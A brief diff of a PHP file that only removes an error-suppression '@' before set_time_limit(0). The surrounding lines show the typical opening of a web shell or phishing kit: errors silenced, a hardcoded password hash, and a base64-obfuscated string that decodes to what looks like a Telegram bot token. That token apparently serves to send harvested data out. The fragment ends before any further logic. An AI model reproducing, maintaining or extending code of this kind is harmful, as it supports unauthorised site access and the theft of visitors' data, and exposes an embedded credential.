@@ -1,7 +1,7 @@
 <?php
 session_start();
 error_reporting(0);
-@set_time_limit(0);
+set_time_limit(0);
 
 $aupas = '9f7b0c36272cf9b3608ae0a33b1a4ade';
 $tk = base64_decode(    "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
